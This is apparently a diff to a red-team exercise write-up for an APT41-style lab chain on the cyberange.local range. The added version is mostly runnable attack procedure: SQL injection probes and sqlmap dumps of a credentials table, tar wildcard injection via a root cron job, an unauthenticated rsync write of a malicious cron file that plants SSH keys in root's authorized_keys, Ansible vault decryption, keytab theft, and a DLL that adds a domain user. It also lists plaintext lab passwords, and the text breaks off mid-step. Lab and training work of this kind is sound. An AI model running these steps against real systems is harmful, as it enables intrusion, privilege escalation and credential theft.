@@ -1,599 +1,720 @@
-# APT41 Operation PIPELINE BREACH — Scenario 3 Write-Up
+# APT41 — Operation PIPELINE BREACH
+## Red Team Exercise Write-Up — Scenario 3
 
-Classification: UNCLASSIFIED // EXERCISE ONLY  
-Purpose: Red-Team / Blue-Team Operator Write-Up  
-Scenario: Pipeline Breach  
-Network: `cyberange.local`  
-Platform: 3 × Ubuntu 22.04, 2 × Windows Server 2019  
+> **Classification:** RESTRICTED — Internal Red Team Use Only
 
-* * *
-
-## Document Purpose
-
-This document explains how Scenario 3 is intended to be executed inside the lab and how each stage should be validated. It is written to stay consistent with the rest of the repository and to support controlled replay when the red team needs a clear, structured reference during an exercise.
-
-This write-up is aligned to the scripted Scenario 3 attack path:
-
-1. `LNXW` — public-facing web application compromise
-2. `LNXBUILDER` — local Linux privilege escalation
-3. `LNXPROC` — rsync abuse leading to root access
-4. `MGMT` — credentialed management pivot and Windows credential access
-5. `DC` — final domain compromise and directory replication
-
-Wherever a value may change between deployments, a placeholder is used.
-
-* * *
-
-## Scope
-
-This write-up is for the following lab hosts:
-
-| Hostname | Role | Operating System |
-|---|---|---|
-| `LNXW` | Public web server | Ubuntu 22.04 |
-| `LNXBUILDER` | Build server | Ubuntu 22.04 |
-| `LNXPROC` | Processing / config sync server | Ubuntu 22.04 |
-| `MGMT` | Management server | Windows Server 2019 |
-| `DC` | Domain controller | Windows Server 2019 |
-
-* * *
-
-## Dynamic Placeholders
-
-Use the following placeholders during delivery or internal adaptation:
-
-| Placeholder | Meaning |
+| Field | Detail |
 |---|---|
-| `<KALI_IP>` | Operator / attacker VM IP |
-| `<DC_IP>` | Current IP address of `DC` |
-| `<LNXW_IP>` | Current IP address of `LNXW` |
-| `<LNXBUILDER_IP>` | Current IP address of `LNXBUILDER` |
-| `<LNXPROC_IP>` | Current IP address of `LNXPROC` |
-| `<MGMT_IP>` | Current IP address of `MGMT` |
-| `<DOMAIN>` | `cyberange.local` |
-| `<OPERATOR_PATH>` | Local operator working directory |
-| `<LOOT_PATH>` | Local loot or output directory |
-| `<NT_HASH>` | NTLM hash recovered during the exercise |
-| `<TIMESTAMP>` | Time value relevant to the current run |
+| **Environment** | 3 × Ubuntu 22.04 &nbsp;\|&nbsp; 2 × Windows Server 2019 |
+| **Domain** | cyberange.local / CYBERANGE |
+| **Emulated Actor** | APT41 (Double Dragon / BARIUM / WICKED PANDA) |
+| **Attack Chain** | SQLi → Tar Wildcard → Rsync → LSASS → DNSAdmin DLL → DCSync |
+| **End Goal** | Full Domain Compromise — DCSync of cyberange.local |
 
-Hostnames remain static and should be written as-is.
+---
 
-* * *
+## 1. Executive Summary
 
-## Operator Prerequisites
+The full attack chain runs across five hosts: a vulnerable Flask web application, a Linux build server, a Linux configuration server, a Windows management host, and a Windows Domain Controller. Starting from a single SQL injection, the chain terminates with a DCSync operation that extracts every credential hash in the **cyberange.local** domain.
 
-Before starting the scenario, confirm the following:
+### Attack Chain at a Glance
 
-- `DC` is online first and DNS is functioning for `cyberange.local`
-- all remaining hosts are reachable and have completed bootstrap
-- the operator system can resolve `DC`, `MGMT`, `LNXW`, `LNXBUILDER`, and `LNXPROC`
-- the exercise tooling approved for the lab build is available on the operator box
-- a clean output directory exists for notes, screenshots, and captured artifacts
-- the operator has access to the internal TTP set used by your team for execution
+| Step | Source | Target | Technique | ATT&CK |
+|---|---|---|---|---|
+| 1 | Attacker (no creds) | LNXW | Blind SQLi — Flask /search endpoint | T1190 |
+| 2 | deploy_user via SSH | LNXBUILDER | Tar wildcard injection via root cron job | T1548.001 |
+| 3 | proxy-admin via SSH | LNXPROC | writable rsync → root | T1222 |
+| 4 | ansible_svc (SMB) | MGMT | LSASS dump — extract svc_itops NT hash | T1003.001 |
+| 5 | svc_itops (DA hash) | DC | DNSAdmin DLL injection → DCSync | T1484.001 / T1003.006 |
 
-Recommended validation checks before running the scenario:
+---
 
-```bash
-ping -c 1 DC.cyberange.local
-ping -c 1 MGMT.cyberange.local
-ping -c 1 LNXW.cyberange.local
-ping -c 1 LNXBUILDER.cyberange.local
-ping -c 1 LNXPROC.cyberange.local
-```
+## 2. Lab Environment
 
-```bash
-nslookup cyberange.local <DC_IP>
-nslookup DC.cyberange.local <DC_IP>
-nslookup MGMT.cyberange.local <DC_IP>
-```
+### 2.1 Host Inventory
 
-If DNS does not resolve correctly, do not continue until name resolution is fixed.
-
-* * *
-
-## Scenario Goal
-
-The objective of Scenario 3 is to simulate a realistic cross-platform enterprise intrusion beginning from an exposed Linux web application and ending in full Active Directory compromise. The environment is designed to create realistic logs for blue-team analysis while keeping the trigger path repeatable for red-team execution.
-
-Final success state:
-
-- the attacker reaches code execution or privileged access on each intended pivot host
-- a valid Windows administrative credential is recovered from `MGMT`
-- access is obtained to `DC`
-- the final stage results in directory replication / domain credential access
-- the blue team receives sufficient evidence across Linux and Windows telemetry to reconstruct the attack chain
-
-* * *
-
-## Attack Chain Summary
-
-| Step | Source | Target | Goal |
+| Hostname | OS | Role | Key Vulnerability |
 |---|---|---|---|
-| 1 | Operator | `LNXW` | Recover deployment credentials from the vulnerable application path |
-| 2 | `deploy_user` | `LNXBUILDER` | Escalate to root and recover the next credential set |
-| 3 | `proxy-admin` | `LNXPROC` | Gain root and recover Windows management access |
-| 4 | `ansible_svc` | `MGMT` | Recover the `svc_itops` credential material |
-| 5 | `svc_itops` | `DC` | Achieve final domain compromise |
+| DC.cyberange.local | Windows Server 2019 | Domain Controller + DNS | DNSAdmin group abuse |
+| MGMT.cyberange.local | Windows Server 2019 | Management Server | DLL hijack — CorpMonitor service |
+| LNXW.cyberange.local | Ubuntu 22.04 | Web / Inventory App | Blind SQL injection (Flask) |
+| LNXBUILDER.cyberange.local | Ubuntu 22.04 | Build Server | Tar wildcard via root cron |
+| LNXPROC.cyberange.local | Ubuntu 22.04 | Config / Process Server | writable rsync |
 
-* * *
+### 2.2 Domain Accounts
 
-## Step 1 — Initial Access on `LNXW`
+| Account | Type | Group Membership | Purpose |
+|---|---|---|---|
+| svc_itops | Service account | Domain Admins, DnsAdmins | IT operations — FINAL TARGET |
+| deploy_user | Service account | Domain Users | Automated SSH deployments |
+| ansible_svc | Service account | Local Admin on MGMT | Ansible Windows automation |
+| jparker, slee, mchen … (×10) | User accounts | Domain Users | Regular staff |
 
-### Objective
+### 2.3 Boot Order
 
-Obtain the `deploy_user` credential from the vulnerable web application path exposed on `LNXW`.
+Boot **DC (.10)** first and wait 90 seconds for AD DS to initialise before starting anything else. **MGMT** must come next, as it requires the DC to be reachable for its domain join. **LNXW, LNXBUILDER, and LNXPROC** can then be started in any order — their bootstrap scripts auto-discover the DC at `x.x.x.10` and configure DNS automatically.
 
-### Starting Position
+The lab is fully operational approximately 3–5 minutes after all five VMs are running.
 
-The operator begins with only network access to the lab and no domain credentials.
+---
 
-### What the Red Team Is Expected to Achieve
+## 3. Environment Setup
 
-- identify the exposed application on `LNXW`
-- confirm the vulnerable path is reachable
-- extract the deployment credential stored in the backing data set
-- validate that the recovered credential works against `LNXBUILDER`
+Before running any attack step, execute the setup function from the attack script. This must be done from a **Kali Linux** attacker machine that has network access to the lab subnet.
 
-### Required Outcome
+### 3.1 Required Tools
 
-At the end of this step, the red team should possess:
-
-- username: `deploy_user`
-- a valid password for SSH access to `LNXBUILDER`
-
-### Beginner Notes
-
-- keep the action focused on the intended exposed application path only
-- do not overcomplicate the first stage with unnecessary enumeration
-- once the credential is recovered, immediately validate it and move on
-
-### Validation Targets
-
-Confirm that the following is true before leaving Step 1:
-
-- `deploy_user` is known
-- the credential is valid
-- the operator can authenticate to `LNXBUILDER`
-
-Example validation only:
-
-```bash
-ssh deploy_user@LNXBUILDER.cyberange.local
-```
-
-Expected result:
-
-- the session opens successfully
-- `whoami` returns `deploy_user`
-- the operator can read normal user-accessible files on `LNXBUILDER`
-
-### Expected Blue-Team Evidence
-
-- web requests to `LNXW`
-- unusual application search activity
-- backend database query activity
-- new SSH login from the operator host to `LNXBUILDER`
-
-### Operator Notes
-
-Record:
-
-- the time Step 1 started
-- the time the credential was recovered
-- the time the first successful SSH login occurred
-
-* * *
-
-## Step 2 — Privilege Escalation on `LNXBUILDER`
-
-### Objective
-
-Escalate from `deploy_user` to root on `LNXBUILDER` and recover the next credential set from the local automation material.
-
-### Starting Position
-
-The operator already has valid SSH access as `deploy_user`.
-
-### What the Red Team Is Expected to Achieve
-
-- identify the intended privileged execution path on `LNXBUILDER`
-- obtain root access
-- access the local Ansible material
-- recover the credential used for the next host
-
-### Required Outcome
-
-At the end of this step, the red team should possess:
-
-- root-level access on `LNXBUILDER`
-- the `proxy-admin` credential for `LNXPROC`
-
-### Beginner Notes
-
-- stay inside the intended writable build path
-- once root access is confirmed, keep post-exploitation minimal
-- collect only what is required for the next pivot
-
-### Validation Targets
-
-Confirm that the following is true before leaving Step 2:
-
-- root access is active on `LNXBUILDER`
-- the next credential has been recovered
-- the next credential is associated with `LNXPROC`
-
-Example validation only:
-
-```bash
-whoami
-hostname
-```
-
-Expected result:
-
-- `whoami` returns `root`
-- `hostname` returns `LNXBUILDER`
-
-If the host uses a separate root persistence method during the lab run, document exactly which method succeeded.
-
-### Expected Blue-Team Evidence
-
-- SSH login by `deploy_user`
-- creation of files in the writable build path
-- scheduled task / cron execution
-- access to local vault or credential files
-- privileged shell creation
-
-### Operator Notes
-
-Record:
-
-- time root access was obtained
-- path used to recover the next credential
-- password or secret identifier recovered for `proxy-admin`
-
-* * *
-
-## Step 3 — Root Access on `LNXPROC`
-
-### Objective
-
-Use the recovered `proxy-admin` access to reach `LNXPROC`, gain root, and recover the Windows management credential set needed for the next pivot.
-
-### Starting Position
-
-The operator has the `proxy-admin` credential and a working path to `LNXPROC`.
-
-### What the Red Team Is Expected to Achieve
-
-- authenticate to `LNXPROC`
-- identify the intended writable service or configuration path
-- obtain root access
-- recover the Windows management credential material
-
-### Required Outcome
-
-At the end of this step, the red team should possess:
-
-- root-level access on `LNXPROC`
-- the `ansible_svc` credential
-- any supporting artifacts needed for documentation, such as the presence of domain-join material
-
-### Beginner Notes
-
-- keep the action aligned to the intended exposed rsync path only
-- once root is obtained, recover the Windows credential and stop
-- do not alter additional files unless needed for the scenario
-
-### Validation Targets
-
-Confirm that the following is true before leaving Step 3:
-
-- root access is active on `LNXPROC`
-- the `ansible_svc` credential has been identified
-- the operator can see domain-related material on the host if expected by the setup
-
-Example validation only:
-
-```bash
-whoami
-hostname
-ls -l /etc/krb5.keytab
-```
-
-Expected result:
-
-- `whoami` returns `root`
-- `hostname` returns `LNXPROC`
-- domain-join material exists if the machine was joined correctly
-
-### Expected Blue-Team Evidence
-
-- SSH login by `proxy-admin`
-- rsync daemon activity
-- creation of a scheduled file or persistence file under `/etc`
-- root SSH access
-- access to local automation or vault data
-
-### Operator Notes
-
-Record:
-
-- the exact time `LNXPROC` root access was obtained
-- the file or configuration area used in the escalation
-- the recovered `ansible_svc` credential
-
-* * *
-
-## Step 4 — Windows Pivot on `MGMT`
-
-### Objective
-
-Use the Windows management credential to access `MGMT` and recover the credential material associated with `svc_itops`.
-
-### Starting Position
-
-The operator has valid credentials for `ansible_svc`.
-
-### What the Red Team Is Expected to Achieve
-
-- authenticate to `MGMT`
-- confirm the account has the expected administrative rights
-- access the credential material present on the host
-- recover the `svc_itops` NTLM material required for the final step
-
-### Required Outcome
-
-At the end of this step, the red team should possess:
-
-- confirmed administrative access on `MGMT`
-- the `svc_itops` NTLM hash or equivalent credential material used by the scenario
-
-### Beginner Notes
-
-- validate access first
-- confirm the host is the intended management server
-- collect only the credential material required for the final domain pivot
-
-### Validation Targets
-
-Confirm that the following is true before leaving Step 4:
-
-- the login to `MGMT` is successful
-- `ansible_svc` has the expected local administrative level
-- `svc_itops` credential material has been recovered
-
-Example validation only:
-
-```powershell
-whoami
-hostname
-whoami /groups
-```
-
-Expected result:
-
-- the active user matches the expected execution context
-- the host is `MGMT`
-- group membership indicates administrative capability
-
-### Expected Blue-Team Evidence
-
-- network authentication from the operator system to `MGMT`
-- Windows logon events
-- process creation events related to administrative execution
-- access to sensitive process memory or equivalent credential-access telemetry
-- scheduled task visibility for persistent logged-on service contexts if present
-
-### Operator Notes
-
-Record:
-
-- the time administrative access to `MGMT` was confirmed
-- the exact form of `svc_itops` material recovered
-- whether the fallback path was needed during collection
-
-* * *
-
-## Step 5 — Final Access on `DC`
-
-### Objective
-
-Use the recovered `svc_itops` material to reach `DC`, complete the final privilege path, and achieve full domain compromise.
-
-### Starting Position
-
-The operator has `svc_itops` credential material from `MGMT`.
-
-### What the Red Team Is Expected to Achieve
-
-- authenticate to `DC`
-- interact with the intended writable operational path on the domain controller
-- trigger the final privilege action
-- validate that domain-level access has been achieved
-- perform the final directory replication stage
-
-### Required Outcome
-
-At the end of this step, the red team should possess:
-
-- confirmed domain-level access
-- successful directory replication output
-- final proof that the full scenario chain executed correctly
-
-### Beginner Notes
-
-- stay on the intended path only
-- validate each condition before moving to the next sub-step
-- once final compromise is confirmed, stop and preserve evidence
-
-### Validation Targets
-
-Confirm that the following is true before closing the scenario:
-
-- the operator can authenticate to `DC`
-- the final privileged state has been created successfully
-- directory replication succeeds
-- the expected domain-level output is captured and preserved
-
-Example validation only:
-
-```bash
-# Record proof files, timestamps, and screenshots after the final stage.
-# Do not continue with unrelated actions once success is confirmed.
-```
-
-### Expected Blue-Team Evidence
-
-- authentication to `DC`
-- SMB file write activity to the intended operational path
-- domain user creation or group membership change
-- replication-related directory access
-- security log entries associated with privilege escalation and credential replication
-
-### Operator Notes
-
-Record:
-
-- the time `DC` access was established
-- the time domain-level access was confirmed
-- the time replication succeeded
-- the artifact names saved for the report pack
-
-* * *
-
-## Evidence Collection Checklist
-
-The red team should preserve the following for after-action review:
-
-- screenshots of each successful pivot
-- recovered credentials or hashes handled according to exercise procedure
-- timestamps for each completed step
-- hostnames and resolved IPs used during the run
-- copies of operator logs stored under `<LOOT_PATH>`
-- final proof of domain compromise
-- any errors encountered and how they were resolved
-
-* * *
-
-## Blue-Team Expected Investigation Path
-
-A defender should be able to reconstruct the scenario roughly in the following order:
-
-1. suspicious web activity against `LNXW`
-2. SSH login to `LNXBUILDER`
-3. privilege escalation behavior and vault access on `LNXBUILDER`
-4. authenticated rsync abuse and root activity on `LNXPROC`
-5. administrative Windows access on `MGMT`
-6. credential-access behavior on `MGMT`
-7. privileged access and final replication activity on `DC`
-
-This ordering should remain consistent even if timestamps shift slightly between runs.
-
-* * *
-
-## Common Execution Issues
-
-### DNS Resolution Fails
-
-Symptoms:
-
-- hostnames do not resolve
-- Kerberos-aware tooling fails
-- SSH or Windows management attempts fail when using hostnames
-
-Checks:
-
-```bash
-nslookup DC.cyberange.local <DC_IP>
-cat /etc/resolv.conf
-```
-
-### Bootstrap Did Not Complete
-
-Symptoms:
-
-- the host is online but not resolving the domain
-- expected scheduled bootstrap task or service did not run
-- the host still holds an incorrect DNS configuration
-
-Checks:
-
-- verify the host can reach `DC`
-- review the local bootstrap log on the affected machine
-- confirm the machine completed its startup sequence
-
-### Credential Validation Fails
-
-Symptoms:
-
-- recovered credentials do not work on the expected next host
-- authentication succeeds on one protocol but not another
-
-Checks:
-
-- confirm the credential was copied correctly
-- confirm the target hostname is correct
-- confirm the host has completed setup and is reachable
-- confirm the exercise run is using the intended scenario version
-
-### Final Stage Does Not Trigger
-
-Symptoms:
-
-- authentication to `DC` works but final domain access is not observed
-- no new privileged state appears
-- replication fails
-
-Checks:
-
-- confirm the correct credential material was used
-- confirm the intended DC-side path exists
-- confirm the relevant service or loader task is active
-- wait for the configured polling interval if the final stage depends on it
-
-* * *
-
-## Reporting Format
-
-For internal consistency, report each step using the same structure:
-
-### Step Title
-- objective
-- source host
-- target host
-- access obtained
-- evidence collected
-- expected detection points
-- result
-
-Example reporting fields:
-
-| Field | Example |
+| Tool | Purpose |
 |---|---|
-| Step | Step 2 — Privilege Escalation on `LNXBUILDER` |
-| Start Time | `<TIMESTAMP>` |
-| End Time | `<TIMESTAMP>` |
-| Starting Access | `deploy_user` |
-| Result | `root on LNXBUILDER` |
-| Evidence | shell screenshot, relevant log copy, recovered credential |
-| Detection Opportunities | SSH logon, cron execution, sensitive file access |
+| nmap | Network discovery and port scanning |
+| sqlmap | SQL injection automation |
+| sshpass | Non-interactive SSH with password authentication |
+| rsync | rsync client for Step 3 |
+| impacket (secretsdump, wmiexec, smbclient) | Windows credential extraction and remote execution |
+| netexec (nxc) | SMB/WMI enumeration, lsassy module for LSASS dumping |
+| x86_64-w64-mingw32-gcc (mingw-w64) | Cross-compile the Windows DLL payload for Step 5 |
 
-* * *
+### 3.2 Running Setup
 
-## Final Success Criteria
+Make the attack script executable and run it as root, then select option `[0]` from the interactive menu to trigger the setup function.
 
-The write-up should be considered complete for a scenario run only when all of the following are true:
+```bash
+chmod +x scripts/attack_chain_s3.sh
+sudo ./scripts/attack_chain_s3.sh
+# From the menu, select [0] — Setup Environment
+```
 
-- each step has a recorded start and end time
-- each pivot has a short proof note
-- each recovered credential is documented
-- final domain-level access is confirmed
-- evidence has been preserved for both red-team review and blue-team analysis
+The setup function performs the following steps automatically:
 
-* * *
+**Host discovery** — Resolves all five lab hosts via DNS (DC queried at `x.x.x.10`). Falls back to port-based fingerprinting if DNS resolution fails for any host.
 
-## Internal Use Note
+**`/etc/hosts` population** — Writes all five hostnames and IPs into the local hosts file so name resolution works without depending on external DNS.
 
-This document is intended to sit alongside the repository documentation and the internal TTP material. It should be used as the scenario write-up and execution reference, while any step-specific controlled operator procedures remain in your approved internal materials.
+**Kerberos config** — Writes `/etc/krb5.conf` for the `CYBERANGE.LOCAL` realm, enabling Kerberos-based tool operations later in the chain.
 
+**SSH keypair** — Generates an Ed25519 keypair at `/opt/redteam/loot/keys/attacker_key`. The public key is injected into root's `authorized_keys` on LNXBUILDER and LNXPROC during Steps 2 and 3.
+
+**DLL compilation** — Cross-compiles `health_check.dll` for Step 5 using mingw. The DLL executes `net user hacker P@ssw0rd123! /add /domain` when loaded by the DNS service.
+
+**Tool verification** — Checks all required tools are present on the attacker machine and reports any that are missing before the chain begins.
+
+**State persistence** — The script saves all extracted credentials to `/opt/redteam/loot/.state_s3` after each step completes. If a step is interrupted, re-running it will reload the last known credential state. Use option `[S]` from the menu to view the current state at any time.
+
+---
+
+## Step 1 — Blind SQL Injection on LNXW
+
+**Target:** `LNXW.cyberange.local ` &nbsp;|&nbsp; **MITRE:** T1190 — Exploit Public-Facing Application
+
+### What This Step Does
+
+The Psychorp Inventory Management System is a Flask web application running on LNXW. It manages IT asset records and stores SSH credentials for automated deployments in a MySQL database. The application was built without input sanitisation — user-supplied values are concatenated directly into SQL query strings.
+
+This step exploits that vulnerability to extract the contents of the `deploy_credentials` table, which contains plaintext SSH usernames and passwords for LNXBUILDER, LNXW, and LNXPROC. No authentication is required to begin the attack.
+
+### Why It Works
+
+The vulnerable search endpoint in `app.py` builds its SQL query by directly interpolating user input with no escaping. A single quote breaks out of the string context, and injecting `SLEEP(5)` causes MySQL to wait five seconds — confirming that the injection is being evaluated server-side. Because the `deploy_credentials` table is in the same database (`inventory_app`) as the inventory records, and the app's MySQL user has SELECT rights across the whole database, a UNION-based injection can pull the entire credentials table in a single request.
+
+```python
+# VULNERABLE — app.py /search route
+# User-supplied "query" is interpolated directly with no sanitisation.
+sql = f"SELECT * FROM inventory WHERE item_name LIKE '%{query}%' OR category LIKE '%{query}%'"
+```
+
+### Phase 1a — Network Discovery
+
+Begin by scanning the subnet from the attacker machine to locate all live lab hosts, then fingerprint the web application running on LNXW.
+
+```bash
+# Broad discovery scan — identify live hosts across the lab subnet
+nmap -sT -T4 --top-ports 1000 -oN /opt/redteam/loot/nmap_subnet.txt <SUBNET>.0/24
+
+# Targeted service scan of LNXW across relevant ports
+nmap -sT -sV -p 22,80,443,3306,5000 LNXW.cyberange.local
+
+# Fingerprint the web application and confirm it is reachable
+curl -v http://LNXW.cyberange.local/
+```
+
+**Expected result:** Ports 22 (SSH) and 80 (Nginx) are open. The HTTP response identifies the application as **Psychorp Inventory Management System v3.2.1**.
+
+### Phase 1b — Confirm SQL Injection
+
+Manually verify the injection point before running sqlmap. This ensures the endpoint is vulnerable and avoids wasted automated scan time.
+
+```bash
+# Inject SLEEP(5) — a 5-second HTTP response delay confirms the input reaches MySQL
+curl -s -o /dev/null -w 'Time: %{time_total}s\n' \
+  'http://LNXW.cyberange.local/search?q=test%27+AND+SLEEP(5)--+-'
+
+# Negative control — no delay expected with SLEEP(0)
+curl -s -o /dev/null -w 'Time: %{time_total}s\n' \
+  'http://LNXW.cyberange.local/search?q=test%27+AND+SLEEP(0)--+-'
+```
+
+A roughly five-second delay on the first request and a normal response time on the second confirms the injection is being evaluated by MySQL.
+
+### Phase 1c — Automated Extraction with sqlmap
+
+sqlmap automates time-based blind extraction. The `--technique=T` flag restricts it to time-based blind injection only. Run the first command to confirm the injectable parameter and identify the database, then run the second to dump the specific credentials table.
+
+```bash
+# Step 1: Identify injectable parameters and confirm the database engine
+sqlmap -u 'http://LNXW.cyberange.local/search?q=test' \
+  --batch --level=3 --risk=2 \
+  --technique=T --dbms=MySQL --threads=3 \
+  --output-dir=/opt/redteam/loot/sqlmap
+
+# Step 2: Dump the deploy_credentials table directly
+sqlmap -u 'http://LNXW.cyberange.local/search?q=test' \
+  --batch --level=3 --risk=2 \
+  --technique=T --dbms=MySQL \
+  -D inventory_app -T deploy_credentials --dump \
+  --threads=10 \
+  --output-dir=/opt/redteam/loot/sqlmap
+```
+
+**Expected output — `deploy_credentials` table:**
+
+| hostname | username | password | purpose |
+|---|---|---|---|
+| LNXBUILDER.cyberange.local | deploy_user | D3pl0y#2025! | Automated build deployment |
+
+
+### Phase 1e — Validate SSH Access
+
+Confirm the extracted credential works before proceeding to Step 2.
+
+```bash
+# Test SSH access to LNXBUILDER using the recovered deploy_user password
+sshpass -p 'D3pl0y#2025!' ssh -o StrictHostKeyChecking=no \
+  deploy_user@LNXBUILDER.cyberange.local \
+  'whoami && hostname && id'
+
+# Expected output:
+# deploy_user
+# LNXBUILDER
+# uid=1001(deploy_user) gid=1001(deploy_user) groups=1001(deploy_user),1002(builders)
+```
+
+> **Step 1 Result:** `deploy_user:D3pl0y#2025!` — SSH access to LNXBUILDER confirmed.
+
+---
+
+## Step 2 — Tar Wildcard Injection on LNXBUILDER
+
+**Target:** `LNXBUILDER.cyberange.local ` &nbsp;|&nbsp; **MITRE:** T1548.001 — Setuid / Cron Privilege Escalation
+
+### What This Step Does
+
+LNXBUILDER runs a root-owned cron job every two minutes that backs up build artifacts using `tar` with a wildcard (`*`) in a directory writable by `deploy_user`. By placing files with names that `tar` interprets as command-line flags, the attacker causes the cron job to execute arbitrary code as root.
+
+After achieving root, the attacker reads the Ansible vault password file stored in plaintext on the same machine and decrypts the vault, which contains SSH credentials for `proxy-admin` on LNXPROC and the Windows credentials for `ansible_svc`.
+
+### Why It Works
+
+The backup script runs as root via cron and expands the `*` wildcard against `/opt/builds/`. When filenames beginning with `--` exist in that directory, `tar` processes them as command-line options rather than file arguments. The `--checkpoint-action=exec=sh shell.sh` option instructs `tar` to execute `shell.sh` at every checkpoint interval. Because the cron runs as root, the script executes with root privileges. The key condition is that `deploy_user` is a member of the `builders` group, which has write access to `/opt/builds/` — a realistic permission for a build account.
+
+```bash
+# /opt/backup-builds.sh (runs as root via cron every 2 minutes)
+# The wildcard causes tar to expand filenames as arguments, including flag-like names
+cd /opt/builds && tar czf /var/backups/builds-$(date +%Y%m%d).tar.gz *
+```
+
+### Phase 2a — Enumerate LNXBUILDER
+
+SSH in as `deploy_user` and gather the information needed to understand the cron configuration and confirm write access to the target directory.
+
+```bash
+# Authenticate to LNXBUILDER as deploy_user
+sshpass -p 'D3pl0y#2025!' ssh deploy_user@LNXBUILDER.cyberange.local
+
+# Read the cron job definition to confirm it runs every 2 minutes as root
+cat /etc/cron.d/build-backup
+# */2 * * * * root /opt/backup-builds.sh
+
+# Read the backup script to confirm the wildcard expansion pattern
+cat /opt/backup-builds.sh
+# cd /opt/builds && tar czf /var/backups/builds-$(date +%Y%m%d).tar.gz *
+
+# Confirm deploy_user has write access to /opt/builds
+ls -la /opt/builds
+```
+
+### Phase 2b — Stage the Wildcard Payload
+
+Create the malicious shell script and the two flag-named files that `tar` will interpret as options. All three files must exist in `/opt/builds/` before the cron job fires.
+
+```bash
+# Write the reverse shell / SSH key injection payload
+# This runs as root when tar processes the checkpoint action
+cat > /opt/builds/shell.sh << 'EOF'
+#!/bin/bash
+mkdir -p /root/.ssh
+echo "$(cat /opt/redteam/loot/keys/attacker_key.pub)" >> /root/.ssh/authorized_keys
+chmod 700 /root/.ssh
+chmod 600 /root/.ssh/authorized_keys
+EOF
+chmod +x /opt/builds/shell.sh
+
+# Create the two flag files — tar treats these as command-line options
+# --checkpoint=1 makes tar evaluate the action at every file processed
+# --checkpoint-action=exec=sh shell.sh tells tar what to run at each checkpoint
+touch /opt/builds/--checkpoint=1
+touch '/opt/builds/--checkpoint-action=exec=sh shell.sh'
+```
+
+### Phase 2c — Wait for the Cron Job to Fire
+
+The root cron job runs every two minutes. Wait for it to execute, then test the SSH key injection by connecting directly as root.
+
+```bash
+# Wait for the cron cycle to complete (up to 120 seconds)
+sleep 125
+
+# Test root SSH access using the injected attacker key
+ssh -i /opt/redteam/loot/keys/attacker_key \
+    -o StrictHostKeyChecking=no \
+    root@LNXBUILDER.cyberange.local 'whoami && hostname'
+# root
+# LNXBUILDER
+```
+
+### Phase 2d — Decrypt the Ansible Vault
+
+With root access confirmed, read the Ansible vault password and use it to decrypt the vault file containing credentials for the next two targets.
+
+```bash
+# Read the plaintext vault password file
+ssh -i /opt/redteam/loot/keys/attacker_key root@LNXBUILDER.cyberange.local \
+    'cat /opt/ansible/.vault_pass'
+
+# Decrypt the vault using the recovered password — reveals proxy-admin and ansible_svc credentials
+ssh -i /opt/redteam/loot/keys/attacker_key root@LNXBUILDER.cyberange.local \
+    'ansible-vault view /opt/ansible/group_vars/all_creds.yml \
+     --vault-password-file /opt/ansible/.vault_pass'
+
+# Vault reveals: proxy-admin:Pr0xy@dm1n2025 and ansible_svc:Ans1bl3#Mgmt2025!
+```
+
+> **Step 2 Result:** Root on LNXBUILDER. Ansible vault decrypted — `proxy-admin:Pr0xy@dm1n2025` and `ansible_svc:Ans1bl3#Mgmt2025!` recovered.
+
+---
+
+## Step 3 — Rsync Write on LNXPROC
+
+**Target:** `LNXPROC.cyberange.local ` &nbsp;|&nbsp; **MITRE:** T1222 — File and Directory Permissions Modification
+
+### What This Step Does
+
+LNXPROC exposes an rsync daemon with a module called `server-configs` that maps directly to `/etc` and is configured as writable without authentication. By writing a malicious cron file into `/etc/cron.d/`, the attacker injects a root cron job that appends the attacker's SSH public key into `/root/.ssh/authorized_keys`. Once the cron fires, the attacker has direct root SSH access to LNXPROC.
+
+After achieving root, the attacker extracts the Kerberos keytab (`/etc/krb5.keytab`) and decrypts a second Ansible vault on this machine to confirm the `ansible_svc` Windows credentials.
+
+### Why It Works
+
+The rsync daemon's configuration for the `server-configs` module sets `read only = false` and specifies no authentication — meaning any host with network access to port 873 can write files anywhere under the module's path. Since the module maps to `/etc`, writing to `cron.d/` is equivalent to creating a new privileged cron job on the system. The cron daemon picks up any new files in that directory automatically.
+
+### Phase 3a — Enumerate the Rsync Service
+
+Probe the rsync daemon to list available modules and confirm the `server-configs` module is accessible without credentials.
+
+```bash
+# List all available rsync modules on LNXPROC
+rsync rsync://LNXPROC.cyberange.local/
+# server-configs    Server configuration files
+
+# List the contents of the module — confirms it maps to /etc on LNXPROC
+rsync rsync://LNXPROC.cyberange.local/server-configs/
+# Full directory listing of /etc/ is returned
+```
+
+### Phase 3b — Write a Malicious Crontab via Rsync
+
+Build a crontab payload that injects the attacker's public SSH key into root's `authorized_keys` every minute, then upload it directly to `/etc/cron.d/` using the writable module.
+
+```bash
+# Read the attacker's SSH public key into a variable
+ATTACKER_KEY=$(cat /opt/redteam/loot/keys/attacker_key.pub)
+
+# Build the crontab payload — fires every minute, runs as root
+cat > /tmp/attacker_cron << EOF
+* * * * * root mkdir -p /root/.ssh && echo '$ATTACKER_KEY' >> /root/.ssh/authorized_keys && chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys
+EOF
+
+# Upload the file to /etc/cron.d/ via the writable rsync module
+rsync /tmp/attacker_cron rsync://LNXPROC.cyberange.local/server-configs/cron.d/attacker
+
+# Clean up the local temp file
+rm -f /tmp/attacker_cron
+```
+
+The file is written to `/etc/cron.d/attacker` on LNXPROC. The cron daemon reads this directory automatically — no further interaction is needed.
+
+### Phase 3c — Wait for Root SSH Access
+
+Wait one minute for the cron job to fire, then test the SSH connection to confirm root access has been granted.
+
+```bash
+# Wait 65 seconds for the cron job to fire and write the key
+sleep 65
+
+# Test root SSH using the injected attacker key
+ssh -i /opt/redteam/loot/keys/attacker_key \
+    -o StrictHostKeyChecking=no \
+    root@LNXPROC.cyberange.local 'whoami && hostname'
+# root
+# LNXPROC
+```
+
+### Phase 3d — Extract the Kerberos Keytab
+
+LNXPROC is domain-joined. When `realm join` ran during setup, it created a Kerberos keytab at `/etc/krb5.keytab` containing the machine account principal `LNXPROC$@CYBERANGE.LOCAL`. Extracting this keytab enables Kerberos authentication to Active Directory services without requiring a password.
+
+```bash
+# Download the keytab from LNXPROC to the attacker machine
+scp -i /opt/redteam/loot/keys/attacker_key \
+    root@LNXPROC.cyberange.local:/etc/krb5.keytab \
+    /opt/redteam/loot/krb5.keytab
+
+# Inspect the keytab to confirm the machine account principal is present
+klist -k /opt/redteam/loot/krb5.keytab
+# Keytab name: FILE:/opt/redteam/loot/krb5.keytab
+# KVNO  Principal
